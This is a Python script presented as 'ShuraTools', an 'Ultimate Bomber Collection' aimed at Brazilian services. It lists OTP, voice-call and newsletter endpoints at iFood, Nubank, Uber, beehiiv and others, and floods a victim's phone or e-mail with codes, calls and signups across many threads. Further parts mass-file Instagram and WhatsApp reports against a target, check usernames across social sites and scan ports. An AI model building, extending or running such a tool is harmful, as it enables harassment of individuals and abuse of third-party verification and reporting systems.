#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools v9.0 ULTIMATE COLLECTION
Baseado em: TBomb + Bombers Collection + APIs Brasileiras 2026
"""

import os, sys, time, random, threading, socket
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    print("[!] pip install requests colorama")
    sys.exit(1)

BANNER = f"""
{Fore.RED}███████╗██╗  ██╗██╗   ██╗██████╗  █████╗ 
{Fore.RED}██╔════╝██║  ██║██║   ██║██╔══██╗██╔══██╗
{Fore.RED}███████╗███████║██║   ██║██████╔╝███████║
{Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║
{Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║
{Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
{Fore.YELLOW}     [ Ultimate Bomber Collection ]
{Fore.WHITE}    v9.0 FINAL ULTIMATE - by Shura
"""

LOCK = threading.Lock()
stats = {"success": 0, "fail": 0}

def clear(): os.system('cls' if os.name == 'nt' else 'clear')
def log(m, t="i"):
    c = {"i": Fore.WHITE+"[*] ", "s": Fore.GREEN+"[+] ", "e": Fore.RED+"[-] ", "w": Fore.YELLOW+"[!] "}
    with LOCK: print(f"{c.get(t, Fore.WHITE)}{m}{Style.RESET_ALL}")

def safe_int(p, d):
    try: return int(input(p) or d)
    except: return d

# ========== MASSIVE API DATABASE ==========
BOMBERS = {
    "sms": [
        {"n": "iFood", "u": "https://marketplace.ifood.com.br/v1/merchants/search/phone-number", "d": {"phoneNumber": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "Magalu", "u": "https://sacola.magazineluiza.com.br/api/v1/customer/send-otp", "d": {"phone": "{T}"}, "h": {}},
        {"n": "Shopee", "u": "https://shopee.com.br/api/v2/authentication/send_code", "d": {"phone": "{T}", "type": 1}, "h": {}},
        {"n": "MercadoLivre", "u": "https://www.mercadolivre.com.br/jms/mlb/lgz/login/H4sIAAAAAAAEAKtWKkotLs5MT1WyUqpWKi1OLYrPTEm", "d": {"phone": "{T}"}, "h": {}},
        {"n": "TikTok", "u": "https://www.tiktok.com/passport/web/send_code/", "d": {"mobile": "{T}", "account_sdk_source": "web"}, "h": {}},
        {"n": "OLX", "u": "https://www.olx.com.br/api/auth/authenticate", "d": {"phone": "{T}"}, "h": {}},
        {"n": "Uber", "u": "https://auth.uber.com/login/phoneNumber", "d": {"phoneNumber": "{T}"}, "h": {}},
        {"n": "99", "u": "https://api.99app.com/api-passenger/v1/users/phone/verify", "d": {"phone": "{T}"}, "h": {}},
        {"n": "Rappi", "u": "https://services.rappi.com.br/api/rocket/v2/guest/verify-phone", "d": {"phone": "{T}"}, "h": {}},
        {"n": "Americanas", "u": "https://www.americanas.com.br/api/v1/customer/otp", "d": {"phone": "{T}"}, "h": {}}
    ],
    "call": [
        {"n": "QuintoAndar", "u": "https://api.quintoandar.com.br/api/v1/auth/send-otp", "d": {"phone": "{T}", "method": "VOICE"}, "h": {"Content-Type": "application/json"}},
        {"n": "Inter", "u": "https://api.inter.co/v1/auth/request-otp", "d": {"phone": "{T}", "type": "VOICE"}, "h": {}},
        {"n": "iFood-Call", "u": "https://wsloja.ifood.com.br/api/v1/customers/phone/verify", "d": {"phone": "{T}", "method": "call"}, "h": {}},
        {"n": "Nubank", "u": "https://prod-s0-webapp-proxy.nubank.com.br/api/token", "d": {"phone": "{T}", "type": "voice"}, "h": {}},
        {"n": "PicPay", "u": "https://api.picpay.com/v2/auth/send-otp", "d": {"phone": "{T}", "channel": "voice"}, "h": {}}
    ],
    "email": [
        {"n": "Tecnoblog", "u": "https://tecnoblog.net/wp-admin/admin-ajax.php", "d": {"action": "tnp", "na": "s", "ne": "{T}", "ny": "on"}, "h": {}},
        {"n": "TheNews", "u": "https://thenewscc.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "InvestNews", "u": "https://investnews.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "TheBrief", "u": "https://thebrief.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "Startups", "u": "https://startups.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "Canaltech", "u": "https://canaltech.com.br/newsletter/", "d": {"email": "{T}"}, "h": {}},
        {"n": "Olhardigital", "u": "https://olhardigital.com.br/newsletter/", "d": {"email": "{T}"}, "h": {}}
    ]
}

# ========== ULTRA BOMBER ENGINE ==========
def ultra_bomber(target, mode, qty, threads, delay):
    global stats
    stats = {"success": 0, "fail": 0}
    apis = BOMBERS.get(mode, [])
    
    if not apis:
        log("Modo inválido!", "e")
        return
    
    log(f"Iniciando {mode.upper()} Bomber com {len(apis)} APIs", "w")
    log(f"Target: {target} | Qty: {qty} | Threads: {threads} | Delay: {delay}s", "i")
    
    def attack(api, idx):
        try:
            # Substitui {T} pelo target
            data = {}
            for k, v in api["d"].items():
                data[k] = v.replace("{T}", target) if isinstance(v, str) else v
            
            # Request
            session = requests.Session()
            res = session.post(
                api["u"],
                json=data if api["h"].get("Content-Type") == "application/json" else None,
                data=data if not api["h"].get("Content-Type") else None,
                headers=api["h"],
                timeout=10
            )
            
            if res.status_code < 400:
                with LOCK:
                    stats["success"] += 1
                log(f"[{idx+1}/{qty}] {api['n']} → OK", "s")
            else:
                with LOCK:
                    stats["fail"] += 1
                log(f"[{idx+1}/{qty}] {api['n']} → {res.status_code}", "w")
            
            time.sleep(delay)
        except:
            with LOCK:
                stats["fail"] += 1
            log(f"[{idx+1}/{qty}] {api['n']} → Timeout", "e")
    
    # Multi-threading
    with ThreadPoolExecutor(max_workers=threads) as exe:
        futures = []
        for i in range(qty):
            api = random.choice(apis)
            futures.append(exe.submit(attack, api, i))
        
        for f in as_completed(futures):
            pass
    
    log(f"Concluído! ✓ {stats['success']} | ✗ {stats['fail']}", "i")

# ========== OSINT ==========
def osint(t):
    log(f"OSINT: {t}", "w")
    u = t.replace("@", "")
    p = {
        "Instagram": f"https://www.instagram.com/{u}/",
        "GitHub": f"https://github.com/{u}",
        "TikTok": f"https://www.tiktok.com/@{u}",
        "Twitter": f"https://twitter.com/{u}",
        "LinkedIn": f"https://www.linkedin.com/in/{u}",
        "Facebook": f"https://www.facebook.com/{u}",
        "Reddit": f"https://www.reddit.com/user/{u}",
        "YouTube": f"https://www.youtube.com/@{u}",
        "Twitch": f"https://www.twitch.tv/{u}",
        "Medium": f"https://medium.com/@{u}"
    }
    for n, url in p.items():
        try:
            r = requests.get(url, timeout=5)
            log(f"{n}: {'FOUND' if r.status_code == 200 else 'N/F'}", "s" if r.status_code == 200 else "i")
        except:
            log(f"{n}: Timeout", "e")

# ========== PORT SCANNER ==========
def portscan(t):
    log(f"Scanning {t}...", "w")
    try:
        ip = socket.gethostbyname(t)
        log(f"IP: {ip}", "i")
        for p in [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]:
            s = socket.socket()
            s.settimeout(0.5)
            if s.connect_ex((ip, p)) == 0:
                log(f"Port {p} OPEN", "s")
            s.close()
    except Exception as e:
        log(f"Error: {e}", "e")

# ========== MENU ==========
def menu():
    while True:
        try:
            clear()
            print(BANNER)
            print("-" * 60)
            print(f"{Fore.RED}[ 1 ] SMS Bomber ({len(BOMBERS['sms'])} APIs)")
            print(f"{Fore.RED}[ 2 ] Call Bomber ({len(BOMBERS['call'])} APIs)")
            print(f"{Fore.RED}[ 3 ] Email Bomber ({len(BOMBERS['email'])} APIs)")
            print(f"{Fore.RED}[ 4 ] Mass Report (IG/Zap)")
            print("-" * 60)
            print(f"{Fore.WHITE}[ 5 ] OSINT Hunter")
            print(f"{Fore.WHITE}[ 6 ] Port Scanner")
            print(f"{Fore.WHITE}[ 0 ] EXIT")
            print("-" * 60)
            
            opt = input(f"{Fore.YELLOW}Shura@Arsenal:~$ {Style.RESET_ALL}").strip()
            if opt == "0": break
            
            if opt in ["1", "2", "3"]:
                mode = {"1": "sms", "2": "call", "3": "email"}[opt]
                
                if mode in ["sms", "call"]:
                    print(f"{Fore.CYAN}[INFO] Formato: 5511999999999{Style.RESET_ALL}")
                    t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                    if not t.isdigit(): log("Inválido!", "e"); time.sleep(1); continue
                else:
                    print(f"{Fore.CYAN}[INFO] Digite o e-mail{Style.RESET_ALL}")
                    t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                    if "@" not in t: log("Inválido!", "e"); time.sleep(1); continue
                
                qty = safe_int("Quantidade (30): ", 30)
                threads = safe_int("Threads (10): ", 10)
                delay = safe_int("Delay (2): ", 2)
                ultra_bomber(t, mode, qty, threads, delay)
            
            elif opt == "4":
                t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                tp = input(f"{Fore.YELLOW}App (ig/zap): {Style.RESET_ALL}").lower()
                url = "https://i.instagram.com/api/v1/users/web_report/" if tp == "ig" else "https://v.whatsapp.net/v2/report"
                for i in range(safe_int("Qty (50): ", 50)):
                    try:
                        requests.post(url, data={"username":t}, timeout=5)
                        log(f"Report {i+1} sent", "s")
                    except: pass
            
            elif opt == "5":
                t = input(f"{Fore.YELLOW}Target (@user): {Style.RESET_ALL}").strip()
                osint(t)
            
            elif opt == "6":
                t = input(f"{Fore.YELLOW}Target (IP/domain): {Style.RESET_ALL}").strip()
                portscan(t)
            
            input(f"\n{Fore.GREEN}Concluído. ENTER...{Style.RESET_ALL}")
            
        except KeyboardInterrupt: break
        except Exception as e:
            log(f"Erro: {e}", "e"); input("\nENTER...")

if __name__ == "__main__":
    menu()
